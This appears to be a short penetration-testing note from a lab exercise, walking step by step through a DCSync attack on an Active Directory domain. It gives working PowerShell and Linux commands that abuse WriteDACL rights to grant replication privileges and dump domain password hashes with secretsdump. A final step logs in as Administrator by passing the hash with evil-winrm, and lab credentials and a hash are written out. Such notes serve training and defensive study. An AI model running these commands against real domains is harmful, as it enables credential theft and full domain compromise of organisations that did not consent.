# **Domains: Perform a DCSync Attack**

**Scenario:**  
You have `WriteDACL` on the domain object. Use it to grant yourself `DCSync` rights.
![Pasted image 20250501172244](https://github.com/user-attachments/assets/2161dfe3-908e-4c76-b72a-82c412583f84)
We owned SVC account and we are member of `Exchange Windows Permissions` that has a `WriteDacl` ACL on on the Domain.
Steps (On target Powershell)
**Steps:**

1. **Import PowerView**  
   ```powershell
   import-module .\powerview.ps1
   ```

2. **Set Up Credentials**  
   ```powershell
   $pass = convertto-securestring 'abc123!' -asplain -force
   $cred = new-object system.management.automation.pscredential('htb\MG', $pass)
   ```

3. **Modify DACL to Grant DCSync Rights**  
   Use `Add-DomainObjectAcl` to grant your account the `DCSync` privilege:
   ```powershell
   Add-DomainObjectAcl -TargetIdentity "testlab.local" -Rights DCSync -PrincipalIdentity MG -Credential $cred
   ```
   - **Why:** This enables your account to request replication data, including password hashes, from the domain.

4. **Perform the DCSync Attack**  
### Extract Secrets and Access Administrator

1. **Dump Secrets Using the New User**  
   Use `impacket-secretsdump` to extract secrets from the domain:
   ```bash
   impacket-secretsdump htb/MG@$IP
   ```

2. **Use the Administrator Hash to Gain Access**  
   Use `evil-winrm` to log in as `Administrator` with the extracted hash:
   ```bash
   evil-winrm -i $IP -u Administrator -H "32693b11e6aa90eb43d32c72a07ceea6"
   ```
